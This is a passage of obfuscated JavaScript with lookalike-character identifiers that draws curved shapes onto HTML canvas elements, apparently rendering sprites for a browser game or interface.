			Δ.bezierCurveTo(74.27557373046875 * ᐃ, ᐃ * 5.406280517578125, ᐃ * 90.27557373046875, ᐃ * 6.406280517578125, 99.27557373046875 * ᐃ, 5.406280517578125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 120.27557373046875, 5.406280517578125 * ᐃ, ᐃ * 126.27557373046875, ᐃ * 10.406280517578125, ᐃ * 136.27557373046875, 20.406280517578125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 157.77557373046875, 37.906280517578125 * ᐃ, 157.77557373046875 * ᐃ, 37.906280517578125 * ᐃ, 179.27557373046875 * ᐃ, 55.406280517578125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.27557373046875, 63.406280517578125 * ᐃ, 192.27557373046875 * ᐃ, ᐃ * 77.40628051757812, ᐃ * 189.27557373046875, ᐃ * 91.40628051757812);
			Δ.bezierCurveTo(ᐃ * 183.27557373046875, 108.40628051757812 * ᐃ, 176.27557373046875 * ᐃ, ᐃ * 110.40628051757812, 169.27557373046875 * ᐃ, 118.40628051757812 * ᐃ);
			Δ.bezierCurveTo(152.27557373046875 * ᐃ, 133.40628051757812 * ᐃ, ᐃ * 152.27557373046875, ᐃ * 133.40628051757812, 135.27557373046875 * ᐃ, ᐃ * 148.40628051757812);
			Δ.bezierCurveTo(ᐃ * 87.27557373046875, 143.40628051757812 * ᐃ, ᐃ * 87.27557373046875, 143.40628051757812 * ᐃ, ᐃ * 39.27557373046875, ᐃ * 138.40628051757812);
			Δ.bezierCurveTo(ᐃ * 26.77557373046875, 123.40628051757812 * ᐃ, ᐃ * 26.77557373046875, ᐃ * 123.40628051757812, 14.27557373046875 * ᐃ, 108.40628051757812 * ᐃ);
			Δ.bezierCurveTo(2.27557373046875 * ᐃ, ᐃ * 95.40628051757812, 2.27557373046875 * ᐃ, 92.40628051757812 * ᐃ, 3.27557373046875 * ᐃ, 83.40628051757812 * ᐃ);
			Δ.bezierCurveTo(4.27557373046875 * ᐃ, 63.406280517578125 * ᐃ, 12.27557373046875 * ᐃ, ᐃ * 60.406280517578125, 24.27557373046875 * ᐃ, ᐃ * 40.406280517578125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆΔ], Ⲇᐃ[5], 4 * ᐃ);
			Δ.globalAlpha = ᐃᐃⵠ;
			Δ.translate(-110 * ᐃ, ᐃ * -155);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(104 * ᐃ, ᐃ * 237.8000030517578);
			Δ.bezierCurveTo(110 * ᐃ, ᐃ * 237.8000030517578, 110 * ᐃ, 237.8000030517578 * ᐃ, ᐃ * 116, 237.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 116, 241.8000030517578 * ᐃ, 116 * ᐃ, ᐃ * 241.8000030517578, ᐃ * 116, ᐃ * 245.8000030517578);
			Δ.bezierCurveTo(115 * ᐃ, 245.3000030517578 * ᐃ, ᐃ * 115, 245.3000030517578 * ᐃ, ᐃ * 114, 244.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 109.5, 244.8000030517578 * ᐃ, ᐃ * 109.5, 244.8000030517578 * ᐃ, ᐃ * 105, 244.8000030517578 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 115, ᐃ * 211.20000457763672);
			Δ.bezierCurveTo(ᐃ * 106, 216.20000457763672 * ᐃ, 101 * ᐃ, 234.20000457763672 * ᐃ, ᐃ * 102, 241.20000457763672 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102, 260.2000045776367 * ᐃ, ᐃ * 115, 269.2000045776367 * ᐃ, ᐃ * 115, 269.2000045776367 * ᐃ);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 265.2000045776367, ᐃ * 115.5, 265.2000045776367 * ᐃ, ᐃ * 116, 261.2000045776367 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112, ᐃ * 264, ᐃ * 108, ᐃ * 254, ᐃ * 106, ᐃ * 242);
			Δ.bezierCurveTo(ᐃ * 105, 232 * ᐃ, 110 * ᐃ, 222 * ᐃ, ᐃ * 115, ᐃ * 218);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 216.75, ᐃ * 115.5, 217.375 * ᐃ, 116 * ᐃ, ᐃ * 216.75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(120 * ᐃ, 207 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, 206 * ᐃ, 114 * ᐃ, ᐃ * 209, 114 * ᐃ, ᐃ * 211);
			Δ.bezierCurveTo(114 * ᐃ, 268 * ᐃ, ᐃ * 114, ᐃ * 241, ᐃ * 114, 271 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 276, ᐃ * 118, ᐃ * 276, 120 * ᐃ, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, 273 * ᐃ, ᐃ * 120.5, ᐃ * 274.5, ᐃ * 121, ᐃ * 273);
			Δ.bezierCurveTo(ᐃ * 121, ᐃ * 241, 121 * ᐃ, 241 * ᐃ, 121 * ᐃ, 209 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[1], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(284 * ᐃ, ᐃ * 238);
			Δ.bezierCurveTo(289.5 * ᐃ, 238 * ᐃ, ᐃ * 289.5, ᐃ * 238, ᐃ * 295, 238 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 295, 241.5 * ᐃ, ᐃ * 295, ᐃ * 241.5, 295 * ᐃ, 245 * ᐃ);
			Δ.bezierCurveTo(289.5 * ᐃ, ᐃ * 245, ᐃ * 289.5, 245 * ᐃ, ᐃ * 284, ᐃ * 245);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 283, 211 * ᐃ);
			Δ.bezierCurveTo(293 * ᐃ, 216 * ᐃ, 297 * ᐃ, ᐃ * 231, ᐃ * 297, ᐃ * 241);
			Δ.bezierCurveTo(298 * ᐃ, ᐃ * 254, ᐃ * 290, ᐃ * 265, 284 * ᐃ, 269 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 283, ᐃ * 266, ᐃ * 283.5, 266 * ᐃ, 283 * ᐃ, 263 * ᐃ);
			Δ.bezierCurveTo(290 * ᐃ, 260 * ᐃ, 292 * ᐃ, ᐃ * 251, ᐃ * 293, ᐃ * 242);
			Δ.bezierCurveTo(ᐃ * 292, 223 * ᐃ, ᐃ * 289, 224 * ᐃ, 284 * ᐃ, 218 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(280 * ᐃ, 206 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 284, 206 * ᐃ, 285 * ᐃ, 208 * ᐃ, 285 * ᐃ, 211 * ᐃ);
			Δ.bezierCurveTo(285 * ᐃ, ᐃ * 241.5, ᐃ * 285, ᐃ * 241.5, 285 * ᐃ, ᐃ * 272);
			Δ.bezierCurveTo(ᐃ * 284, 275 * ᐃ, 284 * ᐃ, 275 * ᐃ, 280 * ᐃ, ᐃ * 275);
			Δ.bezierCurveTo(279 * ᐃ, 273.5 * ᐃ, ᐃ * 279, 273.5 * ᐃ, ᐃ * 278, ᐃ * 272);
			Δ.bezierCurveTo(ᐃ * 278, ᐃ * 240.5, ᐃ * 278, 240.5 * ᐃ, ᐃ * 278, ᐃ * 209);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[1], ᐃ * ⲆⵠΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(138 * ᐃ, ᐃ * 298.40000915527344);
			Δ.bezierCurveTo(141 * ᐃ, 311.40000915527344 * ᐃ, ᐃ * 151, 314.40000915527344 * ᐃ, ᐃ * 162, 316.40000915527344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 224, 316.40000915527344 * ᐃ, 200 * ᐃ, ᐃ * 315.90000915527344, ᐃ * 238, 315.40000915527344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 254, 316.40000915527344 * ᐃ, 261 * ᐃ, 306.40000915527344 * ᐃ, ᐃ * 264, ᐃ * 298.40000915527344);
			Δ.bezierCurveTo(255 * ᐃ, 304.40000915527344 * ᐃ, 250 * ᐃ, ᐃ * 306.40000915527344, ᐃ * 244, ᐃ * 306.40000915527344);
			Δ.bezierCurveTo(ᐃ * 201, 306.90000915527344 * ᐃ, 201 * ᐃ, 306.90000915527344 * ᐃ, ᐃ * 158, 307.40000915527344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 150, ᐃ * 306.40000915527344, ᐃ * 148, 306.40000915527344 * ᐃ, 139 * ᐃ, 300.40000915527344 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ], Ⲇᐃ[1], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(161 * ᐃ, ᐃ * 177.5999984741211);
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 175.5999984741211, ᐃ * 123, ᐃ * 190.5999984741211, ᐃ * 122, 205.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 121, ᐃ * 277.5999984741211, ᐃ * 122, ᐃ * 242.5999984741211, 122 * ᐃ, ᐃ * 279.5999984741211);
			Δ.bezierCurveTo(128 * ᐃ, ᐃ * 297.5999984741211, ᐃ * 137, ᐃ * 299.5999984741211, 143 * ᐃ, 300.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 163, 301.0999984741211 * ᐃ, 163 * ᐃ, 301.0999984741211 * ᐃ, ᐃ * 183, 301.5999984741211 * ᐃ);
			Δ.bezierCurveTo(150 * ᐃ, ᐃ * 300.5999984741211, 135 * ᐃ, ᐃ * 290.5999984741211, 134 * ᐃ, ᐃ * 267.5999984741211);
			Δ.bezierCurveTo(ᐃ * 133, 245.5999984741211 * ᐃ, 146 * ᐃ, 235.5999984741211 * ᐃ, ᐃ * 164, 235.5999984741211 * ᐃ);
			Δ.bezierCurveTo(206 * ᐃ, ᐃ * 236.0999984741211, 206 * ᐃ, ᐃ * 236.0999984741211, ᐃ * 248, ᐃ * 236.5999984741211);
			Δ.bezierCurveTo(266 * ᐃ, ᐃ * 243.5999984741211, ᐃ * 268, 259.5999984741211 * ᐃ, ᐃ * 267, 266.5999984741211 * ᐃ);
			Δ.bezierCurveTo(266 * ᐃ, ᐃ * 288.5999984741211, ᐃ * 251, ᐃ * 294.5999984741211, ᐃ * 244, ᐃ * 297.5999984741211);
			Δ.bezierCurveTo(ᐃ * 228.5, ᐃ * 299.5999984741211, 228.5 * ᐃ, ᐃ * 299.5999984741211, 213 * ᐃ, ᐃ * 301.5999984741211);
			Δ.bezierCurveTo(236 * ᐃ, ᐃ * 301.0999984741211, 236 * ᐃ, ᐃ * 301.0999984741211, ᐃ * 259, 300.5999984741211 * ᐃ);
			Δ.bezierCurveTo(272 * ᐃ, 295.5999984741211 * ᐃ, ᐃ * 277, 288.5999984741211 * ᐃ, ᐃ * 278, ᐃ * 271.5999984741211);
			Δ.bezierCurveTo(ᐃ * 277.5, 236.5999984741211 * ᐃ, 277.5 * ᐃ, ᐃ * 236.5999984741211, ᐃ * 277, ᐃ * 201.5999984741211);
			Δ.bezierCurveTo(ᐃ * 276, 186.5999984741211 * ᐃ, ᐃ * 265, ᐃ * 178.5999984741211, ᐃ * 254, ᐃ * 177.5999984741211);
			Δ.bezierCurveTo(247.5 * ᐃ, ᐃ * 177.5999984741211, ᐃ * 247.5, ᐃ * 177.5999984741211, 241 * ᐃ, ᐃ * 177.5999984741211);
			Δ.bezierCurveTo(ⲆΔⲆᐃΔⲆᐃ * ᐃ, ᐃ * 202.5999984741211, ᐃ * 214, ᐃ * 217.5999984741211, ᐃ * 201, ᐃ * 215.5999984741211);
			Δ.bezierCurveTo(ᐃ * 170, 215.5999984741211 * ᐃ, ᐃ * 152, ᐃ * 197.5999984741211, 161 * ᐃ, 178.5999984741211 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[2], ΔⲆⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(162 * ᐃ, ᐃ * 175.5999984741211);
			Δ.bezierCurveTo(ᐃ * 153, ᐃ * 176.0999984741211, ᐃ * 153, 176.0999984741211 * ᐃ, 144 * ᐃ, 176.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125, 178.5999984741211 * ᐃ, 121 * ᐃ, 196.5999984741211 * ᐃ, ᐃ * 121, 207.5999984741211 * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, ᐃ * 243.20000076293945, 121 * ᐃ, 243.20000076293945 * ᐃ, ᐃ * 121, ᐃ * 278.8000030517578);
			Δ.bezierCurveTo(126 * ᐃ, ᐃ * 298.8000030517578, 137 * ᐃ, ᐃ * 300.8000030517578, 146 * ᐃ, 302.8000030517578 * ᐃ);
			Δ.bezierCurveTo(200.5 * ᐃ, ᐃ * 302.8000030517578, ᐃ * 200.5, ᐃ * 302.8000030517578, ΔⵠⲆᐃᐃΔᐃ * ᐃ, 302.8000030517578 * ᐃ);
			Δ.bezierCurveTo(271 * ᐃ, 301.8000030517578 * ᐃ, 279 * ᐃ, ᐃ * 288.8000030517578, 279 * ᐃ, 273.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 279, 236.8000030517578 * ᐃ, ᐃ * 279, ᐃ * 236.8000030517578, ᐃ * 279, ᐃ * 199.8000030517578);
			Δ.bezierCurveTo(ᐃ * 274, ᐃ * 178.8000030517578, ᐃ * 263, 177.8000030517578 * ᐃ, ΔⵠᐃⵠΔ * ᐃ, 175.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, 175.8000030517578 * ᐃ, ᐃ * 248, 175.8000030517578 * ᐃ, ᐃ * 241, 175.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240, 175.8000030517578 * ᐃ, ᐃ * 240, 175.8000030517578 * ᐃ, ᐃ * 239, ᐃ * 175.8000030517578);
			Δ.bezierCurveTo(ᐃ * 254, 200.8000030517578 * ᐃ, 222 * ᐃ, 211.8000030517578 * ᐃ, 202 * ᐃ, ᐃ * 212.8000030517578);
			Δ.bezierCurveTo(ᐃ * 168, 213.8000030517578 * ᐃ, 151 * ᐃ, 190.8000030517578 * ᐃ, ᐃ * 163, 176.8000030517578 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[3], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(198 * ᐃ, 161.4000015258789 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 198, 186.9000015258789 * ᐃ, ᐃ * 198, 186.9000015258789 * ᐃ, 198 * ᐃ, 212.4000015258789 * ᐃ);
			Δ.bezierCurveTo(201 * ᐃ, 212.4000015258789 * ᐃ, 201 * ᐃ, ᐃ * 212.4000015258789, 204 * ᐃ, 212.4000015258789 * ᐃ);
			Δ.bezierCurveTo(204 * ᐃ, 186.9000015258789 * ᐃ, 204 * ᐃ, 186.9000015258789 * ᐃ, ᐃ * 204, 161.4000015258789 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔΔ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 161, 194 * ᐃ);
			Δ.bezierCurveTo(188 * ᐃ, 169 * ᐃ, ᐃ * 231, 179 * ᐃ, ᐃ * 241, ᐃ * 194);
			Δ.bezierCurveTo(239.5 * ᐃ, ᐃ * 196, 239.5 * ᐃ, ᐃ * 196, 238 * ᐃ, 198 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 221, ᐃ * 179, 182 * ᐃ, 182 * ᐃ, 165 * ᐃ, 198 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ], Ⲇᐃ[1], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(157 * ᐃ, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(ᐃ * 162, 150.80000019073486 * ᐃ, ᐃ * 241, ᐃ * 150.80000019073486, 245 * ᐃ, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(242 * ᐃ, ᐃ * 224.80000019073486, 162 * ᐃ, ᐃ * 228.80000019073486, 157 * ᐃ, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 188.80000019073486, ᐃ * 159, 188.80000019073486 * ᐃ, 161 * ᐃ, 188.80000019073486 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 168, ᐃ * 216.80000019073486, 231 * ᐃ, ᐃ * 218.80000019073486, ᐃ * 241, 188.80000019073486 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 236, ᐃ * 156.80000019073486, 169 * ᐃ, 152.80000019073486 * ᐃ, ᐃ * 161, 188.80000019073486 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ], Ⲇᐃ[Ⲇᐃⵠ], ᐃ * ΔⵠᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 156, 188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 160, ᐃ * 164, ᐃ * 183, ᐃ * 159, 201 * ᐃ, ᐃ * 158);
			Δ.bezierCurveTo(232 * ᐃ, 159 * ᐃ, 244 * ᐃ, 174 * ᐃ, ᐃ * 246, 188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 245, 212 * ᐃ, 213 * ᐃ, ᐃ * 219, 201 * ᐃ, 218 * ᐃ);
			Δ.bezierCurveTo(181 * ᐃ, ᐃ * 221, 158 * ᐃ, 207 * ᐃ, 156 * ᐃ, 190 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[ΔⲆⵠ], ᐃ * ⲆΔΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 162, ᐃ * 189);
			Δ.bezierCurveTo(ᐃ * 166, 170 * ᐃ, ᐃ * 185, 165 * ᐃ, 201 * ᐃ, 164 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 227, 165 * ᐃ, ᐃ * 240, ᐃ * 178, 239 * ᐃ, ᐃ * 188);
			Δ.bezierCurveTo(239 * ᐃ, ᐃ * 204, ᐃ * 210, 210 * ᐃ, ᐃ * 201, 210 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182, 211 * ᐃ, ᐃ * 166, ᐃ * 200, ᐃ * 162, 190 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 131, ᐃ * 262);
			Δ.bezierCurveTo(136 * ᐃ, 241 * ᐃ, 144 * ᐃ, ᐃ * 236, ᐃ * 158, ᐃ * 233);
			Δ.bezierCurveTo(200.5 * ᐃ, 233 * ᐃ, ᐃ * 229, 232 * ᐃ, ᐃ * 243, 233 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 259, 235 * ᐃ, ᐃ * 267, 248 * ᐃ, ᐃ * 269, ᐃ * 260);
			Δ.bezierCurveTo(269 * ᐃ, ᐃ * 266.5, ᐃ * 269, ᐃ * 266.5, ᐃ * 269, ᐃ * 273);
			Δ.bezierCurveTo(ᐃ * 265, ᐃ * 290, ᐃ * 251, ᐃ * 297, ᐃ * 242, ᐃ * 298);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 298, ᐃ * 202, ᐃ * 298, 162 * ᐃ, 298 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, 298 * ᐃ, 136 * ᐃ, ᐃ * 289, 132 * ᐃ, 273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131.5, 268 * ᐃ, ᐃ * 131.5, ᐃ * 268, 131 * ᐃ, 263 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135, ᐃ * 263, ᐃ * 135, ᐃ * 263, 139 * ᐃ, ᐃ * 263);
			Δ.bezierCurveTo(139 * ᐃ, 281 * ᐃ, 151 * ᐃ, ᐃ * 287, 160 * ᐃ, 290 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, ᐃ * 290, 200.5 * ᐃ, 290 * ᐃ, ᐃ * 241, ᐃ * 290);
			Δ.bezierCurveTo(ᐃ * 252, ᐃ * 290, 257 * ᐃ, ᐃ * 281, ᐃ * 262, 271 * ᐃ);
			Δ.bezierCurveTo(261.5 * ᐃ, 267 * ᐃ, 261.5 * ᐃ, 267 * ᐃ, ᐃ * 261, 263 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 260, ᐃ * 249, ᐃ * 251, 242 * ᐃ, 241 * ᐃ, 241 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240.5, 240.5 * ᐃ, ᐃ * 240.5, 240.5 * ᐃ, 240 * ᐃ, ᐃ * 240);
			Δ.bezierCurveTo(200 * ᐃ, ᐃ * 240, ᐃ * 200, ᐃ * 240, 160 * ᐃ, ᐃ * 240);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 244, 142 * ᐃ, 250 * ᐃ, ᐃ * 139, ᐃ * 264);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ⵠⲆⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(130 * ᐃ, ᐃ * 264);
			Δ.bezierCurveTo(132 * ᐃ, ᐃ * 244, ᐃ * 144, ᐃ * 235, 157 * ᐃ, 232 * ᐃ);
			Δ.bezierCurveTo(245 * ᐃ, 232 * ᐃ, 201 * ᐃ, 232 * ᐃ, ᐃ * 245, 232 * ᐃ);
			Δ.bezierCurveTo(264 * ᐃ, 235 * ᐃ, 269 * ᐃ, 251 * ᐃ, ᐃ * 270, ᐃ * 264);
			Δ.bezierCurveTo(ᐃ * 272, ᐃ * 291, ᐃ * 248, 299 * ᐃ, 242 * ᐃ, ᐃ * 299);
			Δ.bezierCurveTo(ᐃ * 200, ᐃ * 299, ᐃ * 200, 299 * ᐃ, 158 * ᐃ, ᐃ * 299);
			Δ.bezierCurveTo(139 * ᐃ, 298 * ᐃ, ᐃ * 130, ᐃ * 276, ᐃ * 130, ᐃ * 265);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 2);
			return Ⲇⵠ
		}

		function ᐃⵠΔᐃⲆⲆⵠΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 400;
			Ⲇⵠ.height = 400 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔΔᐃⵠ;
			Δ.translate(ᐃ * 10, ᐃ * ⵠⵠΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 100.5, ᐃ * 126.34375);
			Δ.bezierCurveTo(151.5 * ᐃ, 104.34375 * ᐃ, ᐃ * 279.5, ᐃ * 188.34375, 297.5 * ᐃ, 292.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 222.5, 307.34375 * ᐃ, ᐃ * 106.5, ᐃ * 196.34375, 100.5 * ᐃ, ᐃ * 127.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⵠΔ], ᐃ * ᐃᐃΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(106.5 * ᐃ, ᐃ * 131.34375);
			Δ.bezierCurveTo(140.5 * ᐃ, 142.34375 * ᐃ, ᐃ * 225.5, 184.34375 * ᐃ, 290.5 * ᐃ, ᐃ * 287.34375);
			Δ.bezierCurveTo(270.5 * ᐃ, 188.34375 * ᐃ, ᐃ * 152.5, 118.34375 * ᐃ, ᐃ * 107.5, ᐃ * 131.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(157.5 * ᐃ, ᐃ * 137.34375);
			Δ.bezierCurveTo(161.5 * ᐃ, ᐃ * 138.34375, 164.5 * ᐃ, ᐃ * 140.34375, ᐃ * 168.5, 142.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 165.5, ᐃ * 156.34375, 141.5 * ᐃ, 176.34375 * ᐃ, 126.5 * ᐃ, ᐃ * 179.34375);
			Δ.bezierCurveTo(ᐃ * 123.5, 173.34375 * ᐃ, 120.5 * ᐃ, ᐃ * 169.34375, 120.5 * ᐃ, ᐃ * 169.34375);
			Δ.bezierCurveTo(ᐃ * 141.5, ᐃ * 161.34375, ᐃ * 156.5, ᐃ * 145.34375, ᐃ * 155.5, ᐃ * 136.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 196.5, 151.34375 * ᐃ);
			Δ.bezierCurveTo(211.5 * ᐃ, ᐃ * 158.34375, 224.5 * ᐃ, 171.34375 * ᐃ, 229.5 * ᐃ, ᐃ * 176.34375);
			Δ.bezierCurveTo(246.5 * ᐃ, 163.34375 * ᐃ, ᐃ * 259.5, 166.34375 * ᐃ, 272.5 * ᐃ, ᐃ * 168.34375);
			Δ.bezierCurveTo(254.5 * ᐃ, 146.34375 * ᐃ, ᐃ * 214.5, ᐃ * 145.34375, ᐃ * 198.5, ᐃ * 151.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δⵠᐃ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(154.5 * ᐃ, 222.34375 * ᐃ);
			Δ.bezierCurveTo(164.5 * ᐃ, 234.34375 * ᐃ, ᐃ * 173.5, ᐃ * 242.34375, 178.5 * ᐃ, ᐃ * 245.34375);
			Δ.bezierCurveTo(ᐃ * 174.5, 265.34375 * ᐃ, ᐃ * 180.5, 274.34375 * ᐃ, ᐃ * 186.5, ᐃ * 283.34375);
			Δ.bezierCurveTo(165.5 * ᐃ, 277.34375 * ᐃ, ᐃ * 151.5, 245.34375 * ᐃ, ᐃ * 155.5, ᐃ * 224.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[ⲆⲆⲆᐃ], ᐃ * ⲆⲆΔΔⵠΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(279.5 * ᐃ, ᐃ * 294.34375);
			Δ.bezierCurveTo(ᐃ * 286.5, 285.84375 * ᐃ, ᐃ * 286.5, ᐃ * 285.84375, 293.5 * ᐃ, 277.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 315.5, 280.34375 * ᐃ, ᐃ * 315.5, 280.34375 * ᐃ, ᐃ * 337.5, 283.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 340.5, 311.34375 * ᐃ, 317.5 * ᐃ, 326.34375 * ᐃ, ᐃ * 307.5, 331.34375 * ᐃ);
			Δ.closePath();
